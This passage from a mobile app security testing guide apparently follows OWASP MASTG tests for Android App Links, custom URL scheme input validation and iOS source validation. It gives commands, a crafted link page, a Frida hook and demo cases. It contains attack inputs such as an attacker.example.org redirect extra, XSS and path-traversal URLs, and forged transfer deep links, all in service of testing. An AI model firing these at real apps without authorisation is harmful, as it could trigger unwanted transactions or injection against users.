A = '{http://schemas.android.com/apk/res/android}'
root = ET.parse(sys.argv[1]).getroot()
PATHS = ('path', 'pathPrefix', 'pathPattern', 'pathAdvancedPattern', 'pathSuffix')

for comp in root.iter():
    if comp.tag not in ('activity', 'activity-alias'):
        continue
    name = comp.get(A + 'name')
    for f in comp.findall('intent-filter'):
        actions = {a.get(A + 'name') for a in f.findall('action')}
        cats = {c.get(A + 'name') for c in f.findall('category')}
        if 'android.intent.action.VIEW' not in actions:
            continue
        data = f.findall('data')
        schemes = {d.get(A + 'scheme') for d in data if d.get(A + 'scheme')}
        hosts = {d.get(A + 'host') for d in data if d.get(A + 'host')} or {'*'}
        paths = {f'{k}={d.get(A + k)}' for d in data for k in PATHS if d.get(A + k)} or {'(any path)'}
        print(f"{name} exported={comp.get(A + 'exported')} autoVerify={f.get(A + 'autoVerify')} "
              f"browsable={'android.intent.category.BROWSABLE' in cats}")
        for s, h, p in itertools.product(sorted(schemes), sorted(hosts), sorted(paths)):
            print(f'    {s}://{h}  {p}')
```

```bash
python3 deeplinks.py apk_out/AndroidManifest.xml
```

```text
com.example.app.DeepLinkActivity exported=true autoVerify=None browsable=True
    http://deeplink.example.com  (any path)
    https://deeplink.example.com  (any path)
com.example.app.RouterActivity exported=true autoVerify=true browsable=True
    exampleapp://example.com  pathPrefix=/app/
    https://example.com  pathPrefix=/app/
```

The second entry is typical of what the script catches: a custom scheme in the same filter as a verified host, which accepts `exampleapp://example.com/app/…` as well, and on Android 11 and lower can make the whole verification fail. [MASTG-TECH-0172](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0172/) describes the same enumeration, plus the [App Link Verification Tester](https://github.com/inesmartins/Android-App-Link-Verification-Tester) (`python3 deeplink_analyser.py -op list-all -apk base.apk`), which does it for you.

On a device, the package manager shows the resolved view, including what the system thinks each filter accepts, and which app wins for a given URL:

```bash
adb shell dumpsys package com.example.app | grep -A30 'Schemes:'
adb shell pm query-activities --brief -a android.intent.action.VIEW \
    -c android.intent.category.BROWSABLE -d 'https://example.com/app/x'
```

Then collect the code side: where the app reads links, and which strings it uses to build them.

```bash
grep -rn -E 'getData\(\)|getDataString\(\)|onNewIntent|getQueryParameter|getPathSegments|getLastPathSegment|getStringExtra' \
    jadx_out/sources/ | grep -v -E '/(androidx|kotlin|kotlinx|com/google/android)/' > deeplink-reads.txt
grep -rhoE '[a-z][a-z0-9+.-]{2,}://[A-Za-z0-9._/-]+' jadx_out/resources/ jadx_out/sources/ | sort -u | head -100
```

**iOS: extract the bundle, schemes and entitlements.**

```bash
unzip -q App.ipa -d ipa && cd ipa/Payload/App.app
plutil -extract CFBundleURLTypes json -o - Info.plist        # custom schemes
plutil -extract LSApplicationQueriesSchemes json -o - Info.plist 2>/dev/null
codesign -d --entitlements - App 2>/dev/null | grep -A10 associated-domains
ldid -e App | grep -A10 associated-domains                  # alternative
rabin2 -OC App | grep -A10 associated-domains                # alternative (radare2)
```

[MASTG-TECH-0166](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0166/) covers scheme registrations and [MASTG-TECH-0111](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0111/) the entitlements. Repeat for extensions in `PlugIns/*.appex`, which have their own `Info.plist` and entitlements. Then find the handler entry points and the route strings in the binary:

```bash
rabin2 -zzq App | grep -E 'openURL|openURLContexts|willConnectToSession|continueUserActivity|webpageURL|sourceApplication|OpenURLOptionsSourceApplicationKey'
rabin2 -zzq App | grep -E '^[a-z][a-z0-9+.-]+://|/app/|transfer|redirect|callback|token|url=' | head -60
```

For SwiftUI apps, the symbols `onOpenURL` and `onContinueUserActivity` show up in `r2 -qc 'f~onOpenURL'` output rather than as Objective-C selectors (the OWASP demos use exactly that).

**Firing links.** Use the same set of methods for every test, so the evidence is comparable:

| Where | Command or method | Notes |
|---|---|---|
| Android, as a browser would | `adb shell "am start -W -a android.intent.action.VIEW -c android.intent.category.BROWSABLE -d 'myapp://transfer?amount=1&to=TEST'"` | No package: shows the chooser or App Link resolution |
| Android, to one package | same, with `com.example.app` appended | Skips the chooser; still implicit within the package |
| Android, explicit component | `adb shell "am start -W -n com.example.app/.DeepLinkActivity -a android.intent.action.VIEW -d 'https://example.com/app/x'"` | What a malicious app can always do with an exported activity |
| Android, with extras | add `--es redirect 'https://attacker.example.org/'` | Mirrors an `intent:` URI or a malicious app |
| iOS Simulator | `xcrun simctl openurl booted 'myapp://transfer?amount=1&to=TEST'` | Simulator builds only (your own build or one supplied for testing) |
| iOS device | `xcrun devicectl device process launch --device <UDID> --payload-url 'myapp://…' com.example.app` | Works for schemes and, if verified on the device, universal links |
| iOS device, user path | Paste into Notes, leave editing, tap (scheme) or long-press › *Open in "App"* (universal link) | Closest to a real victim's tap |
| Jailbroken iOS | `uiopen 'myapp://…'` from a device shell | Quick scripting |
| Both | A crafted web page (below) | The realistic remote attacker |

Mind the quoting: `adb shell` passes its arguments to the device shell as one string, so an unquoted `&` in the URL ends the command on the device. Wrap the whole remote command in double quotes and the URL in single quotes, as above. `-W` waits for the launch and prints which activity handled it.

The crafted page doubles as your proof-of-concept for remote delivery. Serve it from your workstation and open it in the device's browser:

```xml
<!-- links.html -->
<html><body style="font-size:2em">
  <p><a href="myapp://transfer?amount=1&amp;to=TEST">custom scheme</a></p>
  <p><a href="https://example.com/app/transfer?amount=1&amp;to=TEST">app link / universal link</a></p>
  <p><a href="intent://transfer?amount=1#Intent;scheme=myapp;package=com.example.app;S.redirect=https%3A%2F%2Fattacker.example.org%2F;end">Android intent URI with an extra</a></p>
  <p><a href="https://redirect.example.org/r?to=myapp%3A%2F%2Ftransfer%3Famount%3D1">via a redirect</a></p>
</body></html>
```

```bash
python3 -m http.server 8000                    # in the directory holding links.html
adb reverse tcp:8000 tcp:8000                  # Android: device localhost -> workstation
adb shell am start -a android.intent.action.VIEW -d 'http://localhost:8000/links.html' com.android.chrome
xcrun simctl openurl booted 'http://localhost:8000/links.html'   # iOS Simulator shares the Mac's network
```

For a physical iPhone, open the page from your workstation's LAN address (`http://192.168.x.y:8000/links.html`) or any host you control, and tap the links rather than typing them: universal links are only followed from a real navigation.

### MASTG-TEST-0393: Use of Unverified App Links (Android)

Source: [MASTG-TEST-0393](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0393/). Platform: Android. Type: static (configuration), plus a device check. Knowledge: MASTG-KNOW-0019. Best practice: MASTG-BEST-0070.

#### Overview

The test looks for `http`/`https` deep links (`VIEW` + `BROWSABLE` + an `http`/`https` `<data>` scheme) declared without `android:autoVerify="true"`. Such a link is a web link the app would like to handle but has not proven it owns, so any other app can declare the same host and path. On Android 11 and lower the user then sees a chooser with both apps; on Android 12+ the link opens the browser unless the user approves an app for the domain in settings, which a malicious app can ask for with a convincing prompt. OWASP adds the second half that matters just as much: `autoVerify="true"` is necessary but not sufficient, because verification can still fail on the website side. The OWASP page cites public reports where unverified or mishandled deep links led to bearer-token theft, information disclosure, CSRF of a follow action and XSS ([HackerOne 1372667](https://hackerone.com/reports/1372667), [401793](https://hackerone.com/reports/401793), [583987](https://hackerone.com/reports/583987), [341908](https://hackerone.com/reports/341908)).

#### Prerequisites

- The APK decoded with apktool ([MASTG-TECH-0013](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0013/)) and the deep link inventory from [Before you start](#before-you-start-enumerating-and-firing-every-deep-link) ([MASTG-TECH-0172](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0172/)).
- semgrep ([MASTG-TOOL-0110](https://mas.owasp.org/MASTG/tools/generic/MASTG-TOOL-0110/)) with the OWASP rule `mastg-android-deeplink-autoverify-missing.yml`, or the script above.
- A device or emulator with Android 12+ and internet access for the verification check ([MASTG-TECH-0174](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0174/)); `curl`; `apksigner` from the Android SDK build tools.

#### Steps

1. **Find web links without `autoVerify`.** Run the OWASP rule against the decoded manifest:

   ```bash
   semgrep -c mastg-android-deeplink-autoverify-missing.yml apk_out/AndroidManifest.xml --text
   ```

   The rule matches `<data android:scheme="http|https">` inside an activity's filter that has the `VIEW` action and `BROWSABLE` category, unless the filter carries `android:autoVerify="true"`. It assumes the scheme and host sit on the same `<data>` element or are merged with others in the filter; cross-check with the `deeplinks.py` output, which also catches filters where the scheme is on its own `<data>` line.

2. **For each hit, decide what the link is for.** Open the handling activity in jadx and note what the link carries (tokens, codes, IDs, personal data) and what the activity does (navigation only, an action, a WebView load). A link that only opens a public article is a hygiene issue; a login, reset, invitation, payment or OAuth link is a security issue.

3. **For each `autoVerify` filter, check that verification actually succeeded** on a device:

   ```bash
   adb install base.apk                       # or install from the store
   adb shell pm get-app-links com.example.app
   ```

   ```text
   com.example.app:
       ID: 01234567-89ab-cdef-0123-456789abcdef
       Signatures: [AB:CD:…]
       Domain verification state:
         example.com: verified
         www.example.com: 1024
   ```

   For a fresh result, reset and re-verify, wait a minute, and read the state again:

   ```bash
   adb shell pm set-app-links --package com.example.app 0 all
   adb shell pm verify-app-links --re-verify com.example.app
   adb shell pm get-app-links com.example.app
   ```

4. **For each host that is not `verified`, find out why.** Fetch the file exactly as the verifier does and compare it with the installed app's signing certificate:

   ```bash
   curl -s -o /dev/null -w '%{http_code} %{content_type} %{redirect_url}\n' https://www.example.com/.well-known/assetlinks.json
   curl -s https://www.example.com/.well-known/assetlinks.json | python3 -m json.tool
   curl -s 'https://digitalassetlinks.googleapis.com/v1/statements:list?source.web.site=https://www.example.com&relation=delegate_permission/common.handle_all_urls'
   apksigner verify --print-certs base.apk | grep -i 'SHA-256'
   ```

   A `301`/`302`, a non-JSON content type, a missing `package_name`, or a fingerprint that does not match the installed APK's certificate (often the upload key instead of the Play App Signing key) explains the failure. The App Link Verification Tester's `-op verify-applinks` runs the same checks for all hosts.

5. **Observe resolution.** Fire each web link implicitly, without a package:

   ```bash
   adb shell "am start -W -a android.intent.action.VIEW -c android.intent.category.BROWSABLE -d 'https://www.example.com/app/reset?token=TEST'"
   ```

   On Android 12+, a verified link reports the app's activity; an unverified one reports the browser. On an Android 11 or lower device or emulator, an unverified link shows the chooser, which is what the attacker in GT-0029-1 exploits.

#### Observation

The list of `http`/`https` filters with and without `autoVerify`, the `pm get-app-links` output per host, the HTTP status, content type and content of each `assetlinks.json`, the signing certificate fingerprint of the installed APK, and the `am start -W` resolution per link.

#### Evaluation

The test **fails** if any `http`/`https` deep link filter (`VIEW` + `BROWSABLE`) lacks `android:autoVerify="true"`, or if a filter declares it but one or more of its hosts is not `verified` on an up-to-date device, because then the OS does not treat the app as the exclusive handler and another app can intercept the link. It also fails, for apps supporting Android 11 or lower, if a verified filter mixes in a custom scheme or an unverifiable host, since that can cost all the app's App Links their verification on those versions.

It **passes** if every web link filter has `autoVerify="true"` and every declared host reports `verified`.

Rate the failure by what the unverified link carries and triggers (see [Rating findings](#rating-findings)). Note in the report that verification does not stop a malicious app from sending the same URI to the exported activity with an explicit intent; that is the input-validation half covered by MASTG-TEST-0394 and GT-0029-2, not a reason to pass or fail this test.

#### Demo

[MASTG-DEMO-0151](https://mas.owasp.org/MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0151/MASTG-DEMO-0151/). The sample's `DeepLinkActivity` handles `https://deeplink.example.com/transfer?amount=…`, validates the amount properly (positive, at most 10,000), and performs a transfer. The weakness is only that the filter has no `autoVerify`:

```xml
<activity android:name=".DeepLinkActivity" android:exported="true">
    <intent-filter>   <!-- no android:autoVerify="true" -->
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <category android:name="android.intent.category.BROWSABLE" />
        <data android:host="deeplink.example.com" android:scheme="http" />
        <data android:host="deeplink.example.com" android:scheme="https" />
    </intent-filter>
</activity>
```

The OWASP rule flags both `<data>` declarations:

```text
AndroidManifest_reversed.xml
❯❱ rules.mastg-android-deeplink-autoverify-missing
      [MASVS-PLATFORM] Deep link intent filter missing android:autoVerify="true", enabling malicious apps
      to hijack links.
       37┆ <data
       38┆     android:scheme="http"
       39┆     android:host="deeplink.example.com"/>
        ⋮┆----------------------------------------
       40┆ <data
       41┆     android:scheme="https"
       42┆     android:host="deeplink.example.com"/>
```

and the sensitive action is reachable from outside:

```bash
adb shell am start -n org.owasp.mastestapp/.DeepLinkActivity -a android.intent.action.VIEW \
    -d "https://deeplink.example.com/transfer?amount=100"
```

After tapping **Start** in the demo app, it reports `Transferred 100 units to the linked account`. The test fails on the missing `autoVerify`. The demo also shows the point above: the explicit `-n` launch would work just as well with `autoVerify` set, which is why a transfer should never execute on arrival of a link in the first place ([MASWE-0018](/mobile/maswe-0018-missing-auth-on-app-components/)).

### MASTG-TEST-0394: Missing Input Validation in Custom URL Scheme Handlers (Android)

Source: [MASTG-TEST-0394](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0394/). Platform: Android. Type: static (code) with manual review. Knowledge: MASTG-KNOW-0019. Best practice: MASTG-BEST-0071. APIs: `getData`, `getQueryParameter`.

#### Overview

The test finds activities that handle a custom scheme (`VIEW` + `BROWSABLE` + a non-`http`/`https` scheme), follows the incoming `Uri` through the handler, and checks whether each parameter is converted, bounded, sanitised or allowlisted before use. Because any app can send any URI to such a handler, and Android gives the handler no reliable way to identify the sender, an unvalidated parameter is attacker input. OWASP's examples: `myapp://transfer?amount=-1` or `amount=9999999` against business rules, `myapp://open?path=../../data/sensitive.txt` against file access, and `myapp://search?q=<script>alert(1)</script>` against a WebView. The test is scoped to custom schemes, but apply the same review to `http`/`https` handlers: a verified App Link carries attacker-written paths and queries just the same.

#### Prerequisites

- The APK decoded with apktool and decompiled with jadx ([MASTG-TECH-0013](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0013/), [MASTG-TECH-0014](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0014/)).
- semgrep with the OWASP rules `mastg-android-custom-deeplink-scheme.yml` and `mastg-android-deeplink-unvalidated-parameter.yml`.
- jadx-gui for review ([MASTG-TECH-0023](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0023/)); a device with Frida ([MASTG-TOOL-0031](https://mas.owasp.org/MASTG/tools/generic/MASTG-TOOL-0031/)) and adb ([MASTG-TOOL-0004](https://mas.owasp.org/MASTG/tools/android/MASTG-TOOL-0004/)) for confirmation.

#### Steps

1. **Locate scheme declarations and handler reads:**

   ```bash
   semgrep -c mastg-android-custom-deeplink-scheme.yml apk_out/AndroidManifest.xml --text
   semgrep -c mastg-android-deeplink-unvalidated-parameter.yml jadx_out/sources/com/example/ --text
   ```

   The first rule lists every non-`http`/`https` scheme in a `VIEW` + `BROWSABLE` filter. The second is a locator, not a verdict: it flags every `$INTENT.getData()` and `$URI.getQueryParameter(...)`, so you get the entry points and the places parameters are read. Extend the search with `getPathSegments`, `getLastPathSegment`, `getHost`, `getFragment` and `getStringExtra` (from `deeplink-reads.txt`), because handlers often route on the host or path and take extra arguments from extras.

2. **Read each handler** in jadx-gui, starting in `onCreate()` and `onNewIntent()` of the activities from step 1, and follow every value to where it is used. For each parameter, write down the sink and whether there is a check in between:

   | Sink | Look for | Risk |
   |---|---|---|
   | Business logic | amounts, IDs, counts passed as `String` or converted with no bounds | Logic bypass, IDOR-style access |
   | WebView | `loadUrl`, `loadDataWithBaseURL`, `evaluateJavascript`, `postUrl` | Attacker content or script in the app ([MASWE-0035](/mobile/maswe-0035-webviews-loading-untrusted-content/)) |
   | External open / intents | `startActivity(Intent(ACTION_VIEW, Uri.parse(x)))`, `Intent.parseUri(x, …)`, `setClassName(x)` | Open redirect, intent redirection ([MASWE-0032](/mobile/maswe-0032-insecure-intents/)) |
   | Files | `File(base, x)`, `openFileInput(x)`, `FileProvider.getUriForFile` | Path traversal, sharing private files |
   | Queries | `rawQuery`, `execSQL`, string-built selections | SQL injection |
   | Network | base URLs, hostnames, callback URLs, headers | Traffic or tokens sent to an attacker |
   | Navigation | route names, fragment class names, screen IDs | Reaching internal or debug screens |

3. **Check what "validation" means in the code.** A `startsWith("https://example.com")`, `contains("example.com")` or regex on the whole string is not validation; see the bypasses in GT-0029-2. A `toLongOrNull()` without a range check is half of it. Validation on `onCreate()` but not on `onNewIntent()` leaves one path open.

4. **Confirm at runtime** which handler reads what ([MASTG-TECH-0173](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0173/)). This hook prints every URI and query parameter the app reads, with the reading class:

   ```javascript
   // deeplink-trace.js
   Java.perform(() => {
     const Intent = Java.use('android.content.Intent');
     const Uri = Java.use('android.net.Uri');
     const Thread = Java.use('java.lang.Thread');
     const caller = () => {            // a few frames above the hooked method
       const st = Thread.currentThread().getStackTrace();
       const out = [];
       for (let i = 3; i < Math.min(st.length, 6); i++) out.push(st[i].toString());
       return out.join(' < ');
     };
     Intent.getData.implementation = function () {
       const u = this.getData();
       if (u !== null) console.log(`[getData] ${u}  <- ${caller()}`);
       return u;
     };
     Intent.getStringExtra.implementation = function (k) {
       const v = this.getStringExtra(k);
       console.log(`[getStringExtra] ${k} = ${v}  <- ${caller()}`);
       return v;
     };
     Uri.getQueryParameter.implementation = function (k) {
       const v = this.getQueryParameter(k);
       console.log(`[getQueryParameter] ${k} = ${v}  <- ${caller()}`);
       return v;
     };
   });
   ```

   ```bash
   frida -U -f com.example.app -l deeplink-trace.js
   adb shell "am start -W -a android.intent.action.VIEW -d 'myapp://transfer?amount=1&to=TEST&debug=1' com.example.app"
   ```

   Adding parameters the app does not document (`debug`, `url`, `redirect`, `env`) and seeing them read in the trace is a quick way to find hidden behaviour. The Frida CodeShare script [Android Deep Link Observer](https://codeshare.frida.re/@leolashkevych/android-deep-link-observer/) does the `getData` part with more formatting.

5. **Send the boundary values** for every parameter: negative, zero, huge, non-numeric, empty, duplicated (`amount=1&amount=9999`), percent-encoded traversal (`..%2F..%2F`), a URL to an attacker host, a `javascript:` URL, and HTML. Watch the screen, `adb logcat`, and your proxy.

#### Observation

The custom schemes and their handler activities; for each handler, the parameters read (static and from the trace), the sink each one reaches and the check in between (code excerpts with class and method names); the payloads sent and what the app did.

#### Evaluation

The test **fails** if a custom URL scheme handler uses a parameter in a security-relevant operation without adequate validation: no type conversion for a value used as a number, no range or bounds check, no sanitisation before a file path, query or WebView, or no allowlist for a parameter that selects a resource, host, screen or action.

It **passes** if every parameter that reaches such an operation is converted, bounded and checked against an allowlist, on every entry path (`onCreate()` and `onNewIntent()`), and malformed links are rejected. As OWASP notes, the test does not apply to parameters that are meant to be free-form and only reach harmless sinks (a search box pre-filled with the query and rendered as plain text).

#### Demo

[MASTG-DEMO-0152](https://mas.owasp.org/MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0152/MASTG-DEMO-0152/). The app registers `mastestapp://transfer` and passes the `amount` parameter straight through as a string:

```kotlin
class DeepLinkActivity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        lastDeepLink = intent?.data            // entry point
        // … hands over to MainActivity
    }
}

val amount = data.getQueryParameter("amount") ?: return "Missing 'amount' parameter"
return processTransfer(amount)                 // FAIL: no toLong(), no bounds

private fun processTransfer(amount: String) = "Transferring $amount units"
```

The two OWASP rules locate the scheme and the reads:

```text
AndroidManifest_reversed.xml
 ❱ rules.mastg-android-custom-deeplink-scheme
      [MASVS-PLATFORM] Custom deeplink scheme detected in an intent-filter (potentially exposed deeplink).
       39┆ <data
       40┆     android:scheme="mastestapp"
       41┆     android:host="transfer"/>

DeepLinkActivity_reversed.java
❯❱ rules.mastg-android-deeplink-unvalidated-parameter
       24┆ lastDeepLink = intent != null ? intent.getData() : null;

MastgTest_reversed.java
❯❱ rules.mastg-android-deeplink-unvalidated-parameter
       25┆ String amount = data.getQueryParameter("amount");
```

Reading `MastgTest_reversed.java` confirms that `amount` goes from `getQueryParameter` to `processTransfer(String)` untouched. At runtime:

```bash
adb shell am start -a android.intent.action.VIEW -d "mastestapp://transfer?amount=9999999"
adb shell am start -a android.intent.action.VIEW -d "mastestapp://transfer?amount=-1"
adb shell am start -a android.intent.action.VIEW -d "mastestapp://transfer?amount=not-a-number"
```

After tapping **Start**, the app shows `Transferring 9999999 units` (and the same for the other two values). The test fails.

### MASTG-TEST-0370: Missing Input Validation in Custom URL Scheme Handlers (iOS)

Source: [MASTG-TEST-0370](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0370/). Platform: iOS. Type: static (code). Knowledge: MASTG-KNOW-0079. Best practices: MASTG-BEST-0045, MASTG-BEST-0054. APIs: `onOpenURL`, `URLComponents`, `URLQueryItem`.

#### Overview

The iOS counterpart of MASTG-TEST-0394: find the handler for each scheme in `CFBundleURLTypes`, and check whether the values it takes from the URL (host used as the action, path, query items) are converted, bounded, sanitised or allowlisted before they are used. Any app, any web page (after Safari's prompt) and any message can open the scheme, so the handler's input is attacker input. OWASP's example payloads are the same as on Android: `mastgtest://transfer?amount=-1`, `mastgtest://open?path=../../private/secrets.txt`, `mastgtest://search?q=<script>alert(1)</script>`.

#### Prerequisites

- The decrypted app bundle ([MASTG-TECH-0058](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/)); for App Store apps, a decrypted IPA from a jailbroken device or a build supplied for testing.
- radare2 ([MASTG-TOOL-0073](https://mas.owasp.org/MASTG/tools/ios/MASTG-TOOL-0073/)) and rabin2 ([MASTG-TOOL-0129](https://mas.owasp.org/MASTG/tools/generic/MASTG-TOOL-0129/)) for static analysis ([MASTG-TECH-0066](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0066/), [MASTG-TECH-0076](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0076/)); source code if the engagement includes it.
- A device with `xcrun devicectl` ([MASTG-TOOL-0072](https://mas.owasp.org/MASTG/tools/ios/MASTG-TOOL-0072/)) or the simulator, and Frida ([MASTG-TOOL-0039](https://mas.owasp.org/MASTG/tools/ios/MASTG-TOOL-0039/)) for confirmation.

#### Steps

1. **List the schemes** from `Info.plist` ([MASTG-TECH-0166](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0166/)): `plutil -extract CFBundleURLTypes json -o - Payload/App.app/Info.plist`. Note which belong to SDKs (a reversed Google client ID, `fb…`) and which to the app.

2. **Find the handlers.** For Objective-C or UIKit apps, the selectors are in the binary:

   ```bash
   r2 -qc 'aaa; f~openURL' Payload/App.app/App
   r2 -qc 'aaa; f~openURLContexts' Payload/App.app/App
   r2 -qc 'aaa; f~willConnectTo' Payload/App.app/App
   ```

   For SwiftUI, look for the `onOpenURL` symbol and the closure it registers (`r2 -qc 'aaa; f~onOpenURL'`), then for the app's own routing function (in the OWASP demo, `handleURL`). `axt @ <address>` lists cross-references; `pdf @ <address>` disassembles a function.

3. **Follow each value** from `URLComponents.queryItems` / `URLQueryItem.value` (or `URL.host`, `URL.path`, `URL.pathComponents`) to where it is used. In the disassembly, look between the `URLQueryItem.value` call and the sink for conversions (`Int.init`, `Double.init`, `Decimal`), comparisons with constants, set or dictionary lookups (allowlists), and `URL.standardized`/prefix checks for paths. The OWASP demo shows the pattern: `URLComponents.init` → `URL.host` compared with `"transfer"` → `URLQueryItem.value` → straight into `DefaultStringInterpolation`, with no conversion in between.

4. **Do not rely on symbol absence alone.** The OWASP r2 script treats "no `Int_init` flags" as evidence of missing conversion. That works for the demo, which is built with `@_optimize(none)`, but in release builds Swift often inlines or specialises `Int(_:)` into code that no longer carries a recognisable symbol. Read the code path; when in doubt, confirm dynamically.

5. **Confirm dynamically.** Send boundary values with the methods from [Before you start](#before-you-start-enumerating-and-firing-every-deep-link) ([MASTG-TECH-0169](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0169/)) and trace the handler:

   ```bash
   frida-trace -U -f com.example.app -m '*[* application:openURL:options:]' -m '*[* scene:openURLContexts:]'
   xcrun devicectl device process launch --device <UDID> \
       --payload-url 'myapp://transfer?amount=9999999' com.example.app
   ```

   Repeat with `amount=-1`, `amount=not-a-number`, duplicated parameters, a traversal path, an attacker URL and HTML, and watch the UI, the device log (Console.app or `idevicesyslog`) and the proxy.

#### Observation

The registered schemes; for each handler, the disassembly or source of the path from URL parsing to each sink, with addresses or line numbers; the payloads sent and the observed behaviour.

#### Evaluation

The test **fails** if a URL scheme handler uses parameter values directly in a security-relevant operation without adequate validation: a numeric value never converted to a number, no bounds or range check, no sanitisation before a file path, query or WebView, or no allowlist when the value selects a resource or an action. It **passes** if every such value is converted, bounded and allowlisted on all entry points (cold and warm launch), and malformed URLs are discarded. Free-form values that only reach harmless sinks are out of scope, as on Android.

#### Demo

[MASTG-DEMO-0134](https://mas.owasp.org/MASTG/demos/ios/MASVS-PLATFORM/MASTG-DEMO-0134/MASTG-DEMO-0134/). The app registers `mastgtest` and handles it with SwiftUI:

```swift
WindowGroup { ContentView() }
    .onOpenURL { url in URLState.lastURL = url }

// FAIL: [MASTG-TEST-0370] the "amount" value is used as a raw string
static func handleURL(_ url: URL, completion: @escaping (String) -> Void) {
    let components = URLComponents(url: url, resolvingAgainstBaseURL: false)
    if url.host == "transfer" {
        let amount = components?.queryItems?.first(where: { $0.name == "amount" })?.value ?? "0"
        completion("Transferring \(amount) units")
    }
}
```

The r2 script finds the `handleURL` symbol, an empty result for `Int_init`, the `onOpenURL` registration, and the relevant disassembly:

```text
=== References to Int conversion (input validation) ===

=== Disassembly of handleURL: value extraction through string interpolation ===
│   0x100004510      bl sym.imp.Foundation.URLQueryItem.value_...Sgvg_
│   ...
│   0x100004594      bl sym.imp.DefaultStringInterpolation.literalCapacity.interpolationCount_...
│   0x1000045a4      add x0, x8, 0xaf3     ; "Transferring"
```

Between `URLQueryItem.value` at `0x100004510` and the interpolation at `0x100004594` the only branch is the `nil` check that substitutes `"0"`. Launching `mastgtest://transfer?amount=9999999` and `amount=not-a-number` with `devicectl` produces `Transferring 9999999 units` and `Transferring not-a-number units`. The test fails.

### MASTG-TEST-0371: Missing Source Validation in Custom URL Scheme Handlers (iOS)

Source: [MASTG-TEST-0371](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0371/). Platform: iOS. Type: static (code). Knowledge: MASTG-KNOW-0079. Best practices: MASTG-BEST-0045, MASTG-BEST-0055. APIs: `scene:openURLContexts:`, `UIOpenURLContext.options.sourceApplication`.

#### Overview

The test checks whether a URL scheme handler that performs a security-sensitive or irreversible operation reads `sourceApplication` and checks it against an allowlist before acting. Read the result with the platform rule in mind: `sourceApplication` is the caller's bundle ID only when the caller belongs to the **same Apple Developer Team**; for every other app, and for Safari or Notes, it is `nil`. So the check can restrict a scheme to your own app suite (a companion app, a wallet extension's host app), and that is all. It cannot tell a legitimate third-party partner from an attacker, and it is no substitute for in-app confirmation. Universal links have no `sourceApplication` at all.

#### Prerequisites

As for MASTG-TEST-0370: the decrypted bundle, radare2/rabin2, a device or simulator. To exercise a positive case, a second test app signed by the same team, or source access.

#### Steps

1. **Find every URL entry point** (see the table in [MASTG-KNOW-0079](#ios-custom-url-schemes-mastg-know-0079)): `application:openURL:options:`, `scene:openURLContexts:`, `scene:willConnectToSession:options:`, and SwiftUI `onOpenURL`. A pure SwiftUI `.onOpenURL` handler cannot read `sourceApplication`; note that as a structural limitation.

2. **Look for reads of the source.** For the scene API, the Objective-C selector `sourceApplication` is sent to the `UIOpenURLContext.options` (or `UIScene.ConnectionOptions`) object; for the app delegate, the dictionary key constant `UIApplicationOpenURLOptionsSourceApplicationKey` is referenced:

   ```bash
   r2 -qc 'aaa; axt @ reloc.fixup.sourceApplication' Payload/App.app/App
   r2 -qc 'aaa; f~UIApplicationOpenURLOptionsSourceApplicationKey' Payload/App.app/App
   ```

   Disassemble around each cross-reference and confirm that the value is compared with something (a set lookup, string equality) and that the handler returns early when it does not match. Check **both** the cold-launch path (`willConnectTo`) and the warm path (`openURLContexts`); OWASP's best practice calls this out because one of them is often forgotten.

3. **Check what happens on `nil`.** The interesting bug is code like `if let src = sourceApplication, !allowed.contains(src) { return }`, which rejects known-bad callers and lets `nil` through. Since every third-party caller produces `nil`, that check rejects nothing an attacker would send.

4. **Confirm dynamically from outside the app.** Fire the scheme with `devicectl`, Safari or Notes and confirm the sensitive action does not happen. Do not trigger it from a Frida session inside the target app: the request then comes from the app itself, `sourceApplication` is its own bundle ID, and an allowlist that contains it passes where a real attacker's request would not.

#### Observation

The list of URL entry points; the cross-references to `sourceApplication` or the options key per entry point, with the comparison logic; the handler's behaviour for a request from an external app.

#### Evaluation

The test **fails** if any URL scheme handler performs a security-sensitive or irreversible operation without reading `sourceApplication` and rejecting requests whose source is not in an allowlist, on every entry path, with `nil` treated as "not allowed". It **passes** if the check is present on all entry paths and fails closed, or if the scheme only navigates (no privileged action), in which case OWASP notes the test may not apply.

A pass here does not make a sensitive scheme safe. The handler still has to validate its input (MASTG-TEST-0370) and require in-app confirmation for anything that matters; and the scheme itself can still be claimed by another app (GT-0029-1).

#### Demo

[MASTG-DEMO-0135](https://mas.owasp.org/MASTG/demos/ios/MASVS-PLATFORM/MASTG-DEMO-0135/MASTG-DEMO-0135/) is a **passing** sample. The `SceneDelegate` handles both paths and checks the source against an allowlist:

```swift
class SceneDelegate: UIResponder, UIWindowSceneDelegate {
    private let allowedSources: Set<String> = ["com.mastg.testing-app"]

    func scene(_ scene: UIScene, willConnectTo session: UISceneSession,
               options connectionOptions: UIScene.ConnectionOptions) {
        connectionOptions.urlContexts.forEach { handleURL($0) }      // cold launch
    }
    func scene(_ scene: UIScene, openURLContexts URLContexts: Set<UIOpenURLContext>) {
        URLContexts.forEach { handleURL($0) }                         // warm open
    }
    private func handleURL(_ context: UIOpenURLContext) {
        let source = context.options.sourceApplication ?? "(none)"
